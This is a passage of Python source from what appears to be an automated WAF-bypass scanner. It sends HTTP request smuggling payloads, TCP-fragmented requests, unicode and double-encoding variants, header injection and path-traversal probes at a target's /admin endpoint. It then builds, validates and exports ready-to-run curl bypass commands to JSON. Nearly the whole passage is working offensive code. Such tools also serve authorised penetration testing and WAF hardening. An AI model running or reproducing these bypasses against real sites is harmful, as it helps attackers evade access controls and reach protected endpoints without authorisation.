                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "GraphQL", "Batch queries accepted")
        except:
            pass

    def test_tcp_fragmentation(self):
        """Test TCP fragmentation bypass techniques"""
        print("  🌊 Testing TCP Fragmentation Bypass...")
        
        try:
            # Create a raw socket connection for fragmentation testing
            import socket
            
            # Test payload split across TCP segments
            target_host = self.parsed_url.hostname
            target_port = 443 if self.parsed_url.scheme == 'https' else 80
            
            # Create fragmented HTTP request
            request_part1 = b"GET /adm"
            request_part2 = b"in HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n"
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.parsed_url.scheme == 'https':
                import ssl
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target_host)
            
            sock.connect((target_host, target_port))
            
            # Send fragmented request
            sock.send(request_part1)
            time.sleep(0.01)  # Small delay to ensure separate TCP segments
            sock.send(request_part2)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            # Check if fragmentation affected processing
            if "200 OK" in response or "admin" in response.lower():
                discrepancy = {
                    'type': 'TCP Fragmentation',
                    'description': 'TCP fragmentation may bypass WAF inspection',
                    'evidence': 'Fragmented request processed differently',
                    'payload': {'part1': request_part1, 'part2': request_part2}
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "TCP Fragmentation", "Potential fragmentation bypass")
                
        except Exception as e:
            # Fallback to application-level testing
            self.log_discovery("TCP Fragmentation", "Info", "Raw socket test failed, using application-level test")

    def test_compression_bomb(self):
        """Test compression bomb bypass technique"""
        print("  💣 Testing Compression Bomb Bypass...")
        
        try:
            # Create a payload that's small compressed but large uncompressed
            large_payload = "A" * 10000  # 10KB uncompressed
            
            # Compress the payload
            compressed_payload = gzip.compress(large_payload.encode())
            
            # Test if WAF processes compressed vs uncompressed differently
            headers = {
                'Content-Encoding': 'gzip',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': str(len(compressed_payload))
            }
            
            response = self.session.post(
                self.target_url,
                data=compressed_payload,
                headers=headers,
                timeout=10
            )
            
            # Check for processing differences
            if response.status_code in [200, 413, 414, 502]:
                discrepancy = {
                    'type': 'Compression Bypass',
                    'description': 'Compression may affect WAF inspection',
                    'compressed_size': len(compressed_payload),
                    'uncompressed_size': len(large_payload),
                    'ratio': len(large_payload) / len(compressed_payload),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Compression", f"Compression ratio: {discrepancy['ratio']:.1f}x")
                
        except Exception as e:
            pass

    def test_timing_race_conditions(self):
        """Test timing-based parser race conditions"""
        print("  ⏱️ Testing Timing Race Conditions...")
        
        try:
            # Test concurrent requests with timing variations
            import threading
            import queue
            
            results = queue.Queue()
            
            def send_delayed_request(delay, request_data):
                time.sleep(delay)
                try:
                    response = self.session.post(self.target_url, data=request_data, timeout=5)
                    results.put(('success', response.status_code, delay))
                except Exception as e:
                    results.put(('error', str(e), delay))
            
            # Test with different timing delays
            test_data = "param=value&admin=true"
            delays = [0, 0.001, 0.01, 0.1]  # Different micro-timing
            
            threads = []
            for delay in delays:
                thread = threading.Thread(target=send_delayed_request, args=(delay, test_data))
                threads.append(thread)
                thread.start()
            
            # Wait for all threads
            for thread in threads:
                thread.join()
            
            # Analyze timing results
            timing_results = []
            while not results.empty():
                timing_results.append(results.get())
            
            # Check for timing-dependent differences
            status_codes = [r[1] for r in timing_results if r[0] == 'success']
            if len(set(status_codes)) > 1:
                discrepancy = {
                    'type': 'Timing Race Condition',
                    'description': 'Timing affects request processing',
                    'timing_results': timing_results,
                    'unique_responses': len(set(status_codes))
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Timing Race", f"Timing-dependent responses: {len(set(status_codes))}")
                
        except Exception as e:
            pass

    def test_http_smuggling(self):
        """Test for HTTP request smuggling vulnerabilities"""
        print("  🔀 Testing HTTP Request Smuggling...")
        
        smuggling_payloads = [
            # CL-TE discrepancy
            {
                'headers': {
                    'Content-Length': '13',
                    'Transfer-Encoding': 'chunked'
                },
                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            # TE-CL discrepancy
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '0'
                },
                'data': '1\r\nZ\r\n0\r\n\r\n'
            }
        ]
        
        for i, payload in enumerate(smuggling_payloads):
            try:
                marker = self.generate_unique_markers()['uuid']
                
                # Send smuggling attempt
                response = self.session.post(
                    self.target_url,
                    headers=payload['headers'],
                    data=payload['data'].replace('internal', marker),
                    timeout=5
                )
                
                # Look for signs of successful smuggling
                if marker in response.text or response.status_code in [400, 413, 414]:
                    discrepancy = {
                        'type': 'HTTP Smuggling',
                        'test_id': f'smuggling_{i}',
                        'payload': payload,
                        'response_code': response.status_code,
                        'evidence': marker in response.text
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "HTTP Smuggling", f"Potential smuggling in test {i}")
                    
            except Exception as e:
                continue

    def test_unicode_confusion(self):
        """Test Unicode normalization discrepancies"""
        print("  🧬 Testing Unicode Confusion...")
        
        unicode_tests = [
            # Normalization form differences
            {
                'original': '/admin',
                'nfc': '/admin',  # NFC normalization
                'nfd': '/\u0061\u0300\u0064\u006D\u0069\u006E',  # NFD with combining chars
                'confusables': '/αdmin',  # Unicode confusables (α vs a)
            },
            # Zero-width character injection
            {
                'original': '/admin',
                'zwsp': '/ad\u200Bmin',  # Zero-width space
                'zwnj': '/ad\u200Cmin',  # Zero-width non-joiner
                'zwj': '/ad\u200Dmin',   # Zero-width joiner
            }
        ]
        
        for test_group in unicode_tests:
            original = test_group['original']
            
            for variant_name, variant_path in test_group.items():
                if variant_name == 'original':
                    continue
                    
                try:
                    # Test original path
                    resp_original = self.session.get(f"{self.target_url}{original}")
                    
                    # Test variant path  
                    resp_variant = self.session.get(f"{self.target_url}{variant_path}")
                    
                    # Compare responses
                    if resp_original.status_code != resp_variant.status_code:
                        discrepancy = {
                            'type': 'Unicode Confusion',
                            'variant': variant_name,
                            'original_path': original,
                            'variant_path': variant_path,
                            'original_code': resp_original.status_code,
                            'variant_code': resp_variant.status_code
                        }
                        self.chain_map['discrepancies'].append(discrepancy)
                        self.log_discovery("Discrepancy", "Unicode", f"{variant_name}: {resp_original.status_code} vs {resp_variant.status_code}")
                        
                except Exception as e:
                    continue

    def test_encoding_discrepancies(self):
        """Test multi-layer encoding discrepancies"""
        print("  🔢 Testing Encoding Discrepancies...")
        
        test_path = "/admin"
        
        encoding_chains = [
            # URL encoding chains
            {
                'name': 'Double URL Encoding',
                'path': urllib.parse.quote(urllib.parse.quote(test_path)),
            },
            # HTML entity encoding
            {
                'name': 'HTML Entity Encoding',
                'path': ''.join(f'&#{ord(c)};' for c in test_path),
            },
            # Mixed encoding
            {
                'name': 'Mixed Encoding',
                'path': test_path.replace('a', '%61').replace('d', '&#100;'),
            },
            # Base64 in parameter
            {
                'name': 'Base64 Parameter',
                'path': f"/?path={base64.b64encode(test_path.encode()).decode()}",
            }
        ]
        
        # Get baseline response
        try:
            baseline = self.session.get(f"{self.target_url}{test_path}")
        except:
            return
        
        for encoding in encoding_chains:
            try:
                response = self.session.get(f"{self.target_url}{encoding['path']}")
                
                # Compare with baseline
                if response.status_code != baseline.status_code:
                    discrepancy = {
                        'type': 'Encoding Discrepancy',
                        'encoding_name': encoding['name'],
                        'encoded_path': encoding['path'],
                        'baseline_code': baseline.status_code,
                        'encoded_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Encoding", f"{encoding['name']}: {baseline.status_code} vs {response.status_code}")
                    
            except Exception as e:
                continue

    def test_header_confusion(self):
        """Test header parsing discrepancies"""
        print("  📋 Testing Header Confusion...")
        
        header_tests = [
            # Host header confusion
            {
                'name': 'Host Header Injection',
                'headers': {
                    'Host': 'evil.com',
                    'X-Host': self.parsed_url.netloc,
                }
            },
            # Method override
            {
                'name': 'Method Override',
                'headers': {
                    'X-HTTP-Method-Override': 'DELETE',
                    'X-HTTP-Method': 'PUT',
                    'X-Method-Override': 'PATCH'
                }
            },
            # Content-Type confusion
            {
                'name': 'Content-Type Confusion',
                'headers': {
                    'Content-Type': 'application/json',
                    'X-Content-Type': 'application/x-www-form-urlencoded'
                }
            }
        ]
        
        for test in header_tests:
            try:
                response = self.session.get(self.target_url, headers=test['headers'])
                
                # Look for unusual responses that might indicate processing differences
                if response.status_code in [400, 405, 413, 414, 502, 503]:
                    discrepancy = {
                        'type': 'Header Confusion',
                        'test_name': test['name'],
                        'headers': test['headers'],
                        'response_code': response.status_code,
                        'response_headers': dict(response.headers)
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Header", f"{test['name']}: {response.status_code}")
                    
            except Exception as e:
                continue

    def test_method_confusion(self):
        """Test HTTP method handling discrepancies"""
        print("  🔄 Testing Method Confusion...")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']
        results = {}
        
        for method in methods:
            try:
                response = self.session.request(method, self.target_url, timeout=5)
                results[method] = response.status_code
            except Exception as e:
                results[method] = f"Error: {str(e)}"
        
        # Look for inconsistencies
        unique_responses = set(results.values())
        if len(unique_responses) > 2:  # More than just 200 and 405
            discrepancy = {
                'type': 'Method Confusion',
                'method_responses': results,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Methods", f"Inconsistent method handling: {len(unique_responses)} different responses")

    def test_path_normalization(self):
        """Test path normalization discrepancies"""
        print("  📁 Testing Path Normalization...")
        
        base_path = "/admin"
        path_variants = [
            "/admin",
            "/admin/",
            "/admin//",
            "/admin/.",
            "/admin/../admin",
            "/./admin",
            "//admin",
            "/admin/./",
            "/admin/../",
            "/admin%2f",
            "/admin%2F",
            "/admin%5c",
            "/admin%5C"
        ]
        
        responses = {}
        for path in path_variants:
            try:
                response = self.session.get(f"{self.target_url}{path}")
                responses[path] = response.status_code
            except Exception as e:
                responses[path] = f"Error: {str(e)}"
        
        # Look for discrepancies
        unique_responses = set(responses.values())
        if len(unique_responses) > 1:
            discrepancy = {
                'type': 'Path Normalization',
                'path_responses': responses,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Path Normalization", f"Inconsistent path handling: {len(unique_responses)} different responses")

    def test_parameter_pollution(self):
        """Test parameter pollution discrepancies"""
        print("  🔀 Testing Parameter Pollution...")
        
        pollution_tests = [
            "?param=value1&param=value2",
            "?param=value1&PARAM=value2",
            "?param[]=value1&param[]=value2",
            "?param=value1&param%5b%5d=value2"
        ]
        
        responses = {}
        for test in pollution_tests:
            try:
                response = self.session.get(f"{self.target_url}{test}")
                responses[test] = response.status_code
            except Exception as e:
                responses[test] = f"Error: {str(e)}"
        
        # Check for discrepancies
        unique_responses = set(responses.values())
        if len(unique_responses) > 1:
            discrepancy = {
                'type': 'Parameter Pollution',
                'pollution_responses': responses,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Parameter Pollution", f"Inconsistent parameter handling: {len(unique_responses)} different responses")

    def generate_custom_bypasses(self):
        """Generate custom bypass payloads based on discovered discrepancies"""
        print("\n🔍 Phase 4: Custom Bypass Generation")
        
        if not self.chain_map['discrepancies']:
            print("  ℹ️ No discrepancies found - generating generic bypasses")
            self.generate_generic_bypasses()
            return
        
        for discrepancy in self.chain_map['discrepancies']:
            bypass_payload = self.create_bypass_from_discrepancy(discrepancy)
            if bypass_payload:
                self.chain_map['bypasses'].append(bypass_payload)
                self.log_discovery("Bypass", discrepancy['type'], f"Generated custom bypass")

    def create_bypass_from_discrepancy(self, discrepancy):
        """Create a specific bypass payload from a discovered discrepancy"""
        
        try:
            if discrepancy['type'] == 'HTTP Smuggling':
                return {
                    'type': 'HTTP Smuggling Bypass',
                    'payload': discrepancy['payload'],
                    'target': 'HTTP Request Smuggling',
                    'description': f"Exploits {discrepancy['test_id']} smuggling discrepancy",
                    'test_instructions': 'Send malformed requests to bypass WAF and reach backend',
                    'curl_data': {
                        'method': 'POST',
                        'headers': discrepancy['payload']['headers'],
                        'data': discrepancy['payload']['data']
                    }
                }
            
            elif discrepancy['type'] == 'TCP Fragmentation':
                return {
                    'type': 'TCP Fragmentation Bypass',
                    'payload': discrepancy['payload'],
                    'target': 'WAF TCP inspection',
                    'description': 'Fragments TCP packets to bypass deep packet inspection',
                    'implementation': 'Use raw sockets to control TCP segmentation',
                    'curl_data': {
                        'method': 'RAW_SOCKET',
                        'note': 'Cannot be implemented with curl - requires raw socket programming'
                    }
                }
            
            elif discrepancy['type'] == 'Compression Bypass':
                return {
                    'type': 'Compression Bomb Bypass',
                    'payload': f"Compression ratio: {discrepancy['ratio']:.1f}x",
                    'target': 'WAF payload size limits',
                    'description': f"Small compressed payload ({discrepancy['compressed_size']} bytes) expands to {discrepancy['uncompressed_size']} bytes",
                    'implementation': 'Use gzip compression with high expansion ratio',
                    'curl_data': {
                        'method': 'POST',
                        'headers': {'Content-Encoding': 'gzip'},
                        'data_file': 'compressed_payload.gz',
                        'note': 'Create gzip file with large repeated content'
                    }
                }
            
            elif discrepancy['type'] == 'Timing Race Condition':
                return {
                    'type': 'Timing Race Bypass',
                    'payload': 'Concurrent requests with micro-timing',
                    'target': 'Parser state machine',
                    'description': f"Timing variations produce {discrepancy['unique_responses']} different responses",
                    'implementation': 'Send requests with precise timing delays',
                    'curl_data': {
                        'method': 'PARALLEL',
                        'commands': [
                            'curl -X POST $URL -d "param=value&admin=true" &',
                            'sleep 0.001 && curl -X POST $URL -d "param=value&admin=true" &',
                            'sleep 0.01 && curl -X POST $URL -d "param=value&admin=true" &'
                        ]
                    }
                }
            
            elif discrepancy['type'] == 'Unicode Confusion':
                return {
                    'type': 'Unicode Bypass',
                    'payload': discrepancy['variant_path'],
                    'target': 'WAF Unicode normalization',
                    'description': f"Uses {discrepancy['variant']} to bypass filters",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy['variant_path']
                    }
                }
            
            elif discrepancy['type'] == 'Encoding Discrepancy':
                return {
                    'type': 'Encoding Bypass',
                    'payload': discrepancy['encoded_path'],
                    'target': f"{discrepancy['encoding_name']} confusion",
                    'description': f"Exploits encoding differences between layers",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy['encoded_path']
                    }
                }
            
            elif discrepancy['type'] == 'Header Confusion':
                return {
                    'type': 'Header Bypass',
                    'payload': discrepancy['headers'],
                    'target': 'Header parsing differences',
                    'description': f"Exploits {discrepancy['test_name']} confusion",
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy['headers']
                    }
                }
            
            elif discrepancy['type'] == 'Path Normalization':
                # Find the most different response
                responses = discrepancy['path_responses']
                most_different = min(responses.items(), key=lambda x: x[1] if isinstance(x[1], int) else 999)
                return {
                    'type': 'Path Bypass',
                    'payload': most_different[0],
                    'target': 'Path normalization differences',
                    'description': f"Exploits path handling inconsistencies",
                    'curl_data': {
                        'method': 'GET',
                        'path': most_different[0]
                    }
                }
            
            elif discrepancy['type'] == 'Parameter Pollution':
                return {
                    'type': 'Parameter Pollution Bypass',
                    'payload': 'Multiple parameter values',
                    'target': 'Parameter parsing differences',
                    'description': f"Exploits inconsistent parameter handling across {discrepancy['unique_responses']} layers",
                    'curl_data': {
                        'method': 'GET',
                        'query': '?param=safe&param=admin&PARAM=test'
                    }
                }
            
            # New advanced bypass types
            elif discrepancy['type'] == 'Parser State Confusion':
                if discrepancy['subtype'] == 'H2 Pseudo-Header Injection':
                    return {
                        'type': 'H2 Pseudo-Header Bypass',
                        'payload': discrepancy['headers'],
                        'target': 'HTTP/2 to HTTP/1.1 downgrade',
                        'description': 'Exploits H2 pseudo-header acceptance in H1 context',
                        'curl_data': {
                            'method': 'GET',
                            'headers': discrepancy['headers'],
                            'note': 'Use --http2 flag if supported'
                        }
                    }
                elif discrepancy['subtype'] == 'WebSocket State Leak':
                    return {
                        'type': 'WebSocket State Bypass',
                        'payload': 'WebSocket upgrade followed by normal request',
                        'target': 'Protocol state machine',
                        'description': 'Exploits state leakage between WebSocket and HTTP',
                        'curl_data': {
                            'method': 'SEQUENCE',
                            'commands': [
                                'curl -H "Upgrade: websocket" -H "Connection: Upgrade" $URL',
                                'curl $URL/admin'
                            ]
                        }
                    }
            
            elif discrepancy['type'] == 'Buffer Boundary':
                # Handle different buffer types safely
                buffer_size = discrepancy.get('buffer_size', 0)
                return {
                    'type': 'Buffer Overflow Bypass',
                    'payload': f"{buffer_size} byte boundary",
                    'target': 'Parser buffer limits',
                    'description': f"Exploits {discrepancy.get('subtype', 'buffer limit')} at {buffer_size} bytes",
                    'curl_data': {
                        'method': 'GET',
                        'headers': {'X-Large-Header': 'A' * (buffer_size - 100) if buffer_size > 100 else 'A' * 50},
                        'note': f'Add payload after {buffer_size} byte boundary'
                    }
                }
            
            elif discrepancy['type'] == 'Nested Encoding':
                return {
                    'type': 'Multi-Encoding Bypass',
                    'payload': discrepancy.get('encoded_path', discrepancy.get('payload', 'Mixed encoding')),
                    'target': 'Encoding parser stack',
                    'description': f"Exploits {discrepancy['subtype']} encoding confusion",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy.get('encoded_path', '/admin'),
                        'encoding': discrepancy['subtype']
                    }
                }
            
            elif discrepancy['type'] == 'Cache Key Confusion':
                return {
                    'type': 'Cache Poisoning Bypass',
                    'payload': 'Case/parameter variations',
                    'target': 'CDN cache key generation',
                    'description': f"Exploits {discrepancy['subtype']} in cache key computation",
                    'curl_data': {
                        'method': 'GET',
                        'variations': discrepancy.get('variations', {}),
                        'note': 'Try different case/parameter order combinations'
                    }
                }
            
            elif discrepancy['type'] == 'ML WAF Evasion':
                return {
                    'type': 'ML Model Bypass',
                    'payload': discrepancy['subtype'],
                    'target': 'Machine learning WAF model',
                    'description': f"Uses {discrepancy['subtype']} to evade ML detection",
                    'curl_data': {
                        'method': 'POST' if discrepancy['subtype'] == 'Context Window Overflow' else 'GET',
                        'payload_size': discrepancy.get('payload_size', 0),
                        'technique': discrepancy['subtype']
                    }
                }
            
            elif discrepancy['type'] == 'Container Orchestration':
                return {
                    'type': 'K8s Service Mesh Bypass',
                    'payload': discrepancy['headers'],
                    'target': 'Service mesh routing',
                    'description': 'Exploits Kubernetes service mesh headers',
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy['headers'],
                        'path': '/admin'
                    }
                }
            
            elif discrepancy['type'] == 'TOCTOU Race':
                return {
                    'type': 'TOCTOU Bypass',
                    'payload': 'Race condition timing attack',
                    'target': 'Async validation logic',
                    'description': 'Exploits time-of-check vs time-of-use race condition',
                    'curl_data': {
                        'method': 'RACE',
                        'timing': discrepancy.get('timing_results', []),
                        'note': 'Requires precise timing between requests'
                    }
                }
            
            elif discrepancy['type'] == 'Protocol Tunneling':
                return {
                    'type': 'Protocol Tunneling Bypass',
                    'payload': discrepancy.get('technique', 'Protocol confusion'),
                    'target': 'Protocol parser',
                    'description': f"Exploits {discrepancy.get('subtype', 'protocol')} confusion",
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy.get('headers', {}),
                        'note': 'May require special protocol handling'
                    }
                }
            
            return None
        
        except Exception as e:
            print(f"  ⚠️ Error creating bypass for {discrepancy.get('type', 'unknown')}: {str(e)}")
            return None

    def generate_generic_bypasses(self):
        """Generate generic bypass techniques"""
        generic_bypasses = [
            {
                'type': 'Generic Path Traversal',
                'payload': '/./target/../',
                'target': 'Path normalization',
                'description': 'Classic path traversal technique',
                'curl_data': {
                    'method': 'GET',
                    'path': '/./admin/../admin'
                }
            },
            {
                'type': 'Generic Double Encoding',
                'payload': '%252e%252e%252f',
                'target': 'Double URL decoding',
                'description': 'Double URL encoding bypass',
                'curl_data': {
                    'method': 'GET',
                    'path': '/%252e%252e%252fadmin'
                }
            },
            {
                'type': 'Generic Unicode',
                'payload': '/αdmin',  # α looks like 'a'
                'target': 'Unicode confusables',
                'description': 'Unicode lookalike characters',
                'curl_data': {
                    'method': 'GET',
                    'path': '/αdmin'
                }
            }
        ]
        
        self.chain_map['bypasses'].extend(generic_bypasses)

    def test_generated_bypasses(self):
        """Test the generated bypass payloads"""
        print("\n🔍 Phase 5: Bypass Validation")
        
        if not self.chain_map['bypasses']:
            print("  ℹ️ No bypasses to test")
            return
        
        # Check if we have a forbidden endpoint to test against
        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
            print("  ⚠️ No forbidden endpoint available for bypass validation")
            print("  💡 Use --forbidden-endpoint to specify one for better validation")
            return
        
        for bypass in self.chain_map['bypasses']:
            success = self.validate_bypass(bypass)
            bypass['validated'] = success
            
            status = "✅" if success else "❌"
            print(f"  {status} {bypass['type']}: {bypass['description']}")

    def validate_bypass(self, bypass):
        """Validate a specific bypass technique"""
        try:
            print(f"    🔍 Testing {bypass['type']}: {bypass['description']}")
            
            # Use discovered forbidden endpoint if available
            test_url = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            
            if bypass['type'] in ['Unicode Bypass', 'Path Bypass']:
                response = self.session.get(f"{self.target_url}{bypass['payload']}")
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'Header Bypass':
                response = self.session.get(test_url, headers=bypass['payload'])
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'Encoding Bypass':
                response = self.session.get(f"{self.target_url}{bypass['payload']}")
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'HTTP Smuggling Bypass':
                # Test HTTP smuggling by sending the malformed request
                payload = bypass['payload']
                if isinstance(payload, dict) and 'headers' in payload and 'data' in payload:
                    response = self.session.post(
                        self.target_url, 
                        headers=payload['headers'], 
                        data=payload['data'],
                        timeout=10
                    )
                    # Smuggling success indicators: unusual status codes or response patterns
                    success = response.status_code in [200, 400, 413, 414, 502] or 'smuggl' in response.text.lower()
                    print(f"      Response: {response.status_code}, Content-Length: {len(response.content)} ({'POTENTIAL' if success else 'FAILED'})")
                    return success
                else:
                    print(f"      Invalid payload format")
                    return False
            
            elif bypass['type'] == 'TCP Fragmentation Bypass':
                # Test TCP fragmentation by attempting fragmented connection
                try:
                    import socket
                    target_host = self.parsed_url.hostname
                    target_port = 443 if self.parsed_url.scheme == 'https' else 80
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if self.parsed_url.scheme == 'https':
                        import ssl
                        context = ssl.create_default_context()
                        sock = context.wrap_socket(sock, server_hostname=target_host)
                    
                    sock.connect((target_host, target_port))
                    
                    # Send fragmented HTTP request
                    sock.send(b"GET / HTTP/1.1\r\n")
                    time.sleep(0.01)
                    sock.send(f"Host: {target_host}\r\n\r\n".encode())
                    
                    response = sock.recv(1024)
                    sock.close()
                    
                    success = b"200 OK" in response or b"HTTP" in response
                    print(f"      Fragmented connection: {'SUCCESS' if success else 'FAILED'}")
                    return success
                    
                except Exception as e:
                    print(f"      Fragmentation test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Compression Bomb Bypass':
                # Test compression bomb by sending compressed payload
                try:
                    import gzip
                    test_payload = "test=admin&user=root" * 100  # Expand this
                    compressed = gzip.compress(test_payload.encode())
                    
                    headers = {
                        'Content-Encoding': 'gzip',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': str(len(compressed))
                    }
                    
                    response = self.session.post(self.target_url, data=compressed, headers=headers, timeout=10)
                    success = response.status_code in [200, 413, 414, 502]  # Any processing = potential bypass
                    ratio = len(test_payload) / len(compressed)
                    print(f"      Compression {ratio:.1f}x, Response: {response.status_code} ({'POTENTIAL' if success else 'BLOCKED'})")
                    return success
                    
                except Exception as e:
                    print(f"      Compression test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Timing Race Bypass':
                # Test timing race by sending concurrent requests
                try:
                    import threading
                    results = []
                    
                    def test_request():
                        try:
                            response = self.session.get(test_url, timeout=5)
                            results.append(response.status_code)
                        except:
                            results.append(0)
                    
                    # Send 3 concurrent requests
                    threads = []
                    for _ in range(3):
                        thread = threading.Thread(target=test_request)
                        threads.append(thread)
                        thread.start()
                    
                    for thread in threads:
                        thread.join()
                    
                    unique_results = set(results)
                    success = len(unique_results) > 1  # Different responses = timing affects processing
                    print(f"      Timing test results: {results}, Unique: {len(unique_results)} ({'SUCCESS' if success else 'CONSISTENT'})")
                    return success
                    
                except Exception as e:
                    print(f"      Timing test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Parameter Pollution Bypass':
                # Test parameter pollution
                test_url_pollution = f"{test_url}?param=safe&param=admin&PARAM=test"
                response = self.session.get(test_url_pollution)
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Parameter pollution: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            else:
                print(f"      Unknown bypass type: {bypass['type']}")
                return False
                
        except Exception as e:
            print(f"      Validation error: {str(e)}")
            return False

    def export_bypasses_json(self):
        """Export bypasses to JSON file for curl generation"""
        if not self.chain_map['bypasses']:
            print("\n⚠️ No bypasses to export")
            return None
        
        # Prepare bypass data for JSON export
        export_data = {
            'target_url': self.target_url,
            'scan_timestamp': datetime.now().isoformat(),
            'infrastructure_chain': self.chain_map['layers'],
            'total_discrepancies': len(self.chain_map['discrepancies']),
            'total_bypasses': len(self.chain_map['bypasses']),
            'bypasses': []
        }
        
        for bypass in self.chain_map['bypasses']:
            bypass_entry = {
                'id': f"bypass_{len(export_data['bypasses']) + 1}",
                'type': bypass['type'],
                'target': bypass['target'],
                'description': bypass['description'],
                'validated': bypass.get('validated', False),
                'curl_data': bypass.get('curl_data', {}),
                'payload': str(bypass.get('payload', ''))
            }
            
            # Generate curl command based on bypass type
            curl_command = self.generate_curl_command(bypass_entry)
            bypass_entry['curl_command'] = curl_command
            
            export_data['bypasses'].append(bypass_entry)
        
        # Save to JSON file
        filename = f"bypasses_{self.parsed_url.netloc}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2, default=str)
        
        print(f"\n✅ Bypasses exported to: {filename}")
        print(f"   Total bypasses: {len(export_data['bypasses'])}")
        print(f"   Validated: {len([b for b in export_data['bypasses'] if b['validated']])}")
        
        return filename

    def generate_curl_command(self, bypass_entry):
        """Generate curl command for a specific bypass"""
        base_url = self.target_url
        curl_data = bypass_entry.get('curl_data', {})
        
        if not curl_data:
            return f"# No curl data available for {bypass_entry['type']}"
        
        method = curl_data.get('method', 'GET')
        
        if method == 'RAW_SOCKET':
            return f"# {bypass_entry['type']} requires raw socket programming - cannot be implemented with curl"
        
        elif method == 'SEQUENCE':
            commands = curl_data.get('commands', [])
            return '\n'.join([f"# Step {i+1}: {cmd.replace('$URL', base_url)}" 
                            for i, cmd in enumerate(commands)])
        
        elif method == 'PARALLEL':
            commands = curl_data.get('commands', [])
            return '\n'.join([cmd.replace('$URL', base_url) for cmd in commands])
        
        elif method == 'RACE':
            return f"# Race condition attack - requires precise timing\n# Use multiple terminals or scripting"
        
        else:
            # Build standard curl command
            cmd_parts = ['curl']
            
            # Add method
            if method != 'GET':
                cmd_parts.append(f'-X {method}')
            
            # Add headers
            headers = curl_data.get('headers', {})
            for header, value in headers.items():
                if not header.startswith(':'):  # Skip HTTP/2 pseudo-headers
                    cmd_parts.append(f'-H "{header}: {value}"')
            
            # Add data
            if 'data' in curl_data:
                if isinstance(curl_data['data'], str):
                    cmd_parts.append(f'-d "{curl_data["data"]}"')
                elif isinstance(curl_data['data'], dict):
                    cmd_parts.append(f"-d '{json.dumps(curl_data['data'])}'")
            
            # Add path/query
            path = curl_data.get('path', '')
            query = curl_data.get('query', '')
            full_url = f"{base_url}{path}{query}"
            
            cmd_parts.append(f'"{full_url}"')
            
            # Add notes
            if 'note' in curl_data:
                return f"# Note: {curl_data['note']}\n{' '.join(cmd_parts)}"
            
            return ' '.join(cmd_parts)

    def generate_report(self):
        """Generate comprehensive analysis report"""
        
        report = f"""
========================================
APPLICATION STACK TRACEROUTE REPORT
========================================

Target: {self.target_url}
Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

🔍 PROTOCOL SUPPORT:
HTTP/1.1: ✅
HTTP/2: {"✅" if self.protocols['http2'] else "❌"}
HTTP/3: {"✅" if self.protocols['http3'] else "❌"}
WebSocket: {"✅" if self.protocols['websocket'] else "❌"}

🏗️ INFRASTRUCTURE CHAIN:
{' → '.join(self.chain_map['layers']) if self.chain_map['layers'] else 'Unable to map complete chain'}

🔍 DISCOVERED COMPONENTS:
"""
        
        for layer, discoveries in self.chain_map['fingerprints'].items():
            report += f"\n{layer}:\n"
            for discovery_type, details in discoveries.items():
                report += f"  - {discovery_type}: {details}\n"
        
        # Add forbidden endpoint info
        if self.discovered_forbidden_endpoint:
            report += f"\n🚫 FORBIDDEN ENDPOINT: {self.discovered_forbidden_endpoint}\n"
        elif not self.skip_forbidden_tests:
            report += f"\n⚠️ NO FORBIDDEN ENDPOINT FOUND - Some tests were limited\n"
        
        report += f"""
🚨 PARSING DISCREPANCIES FOUND: {len(self.chain_map['discrepancies'])}
"""
        
        # Group discrepancies by type
        discrepancy_types = {}
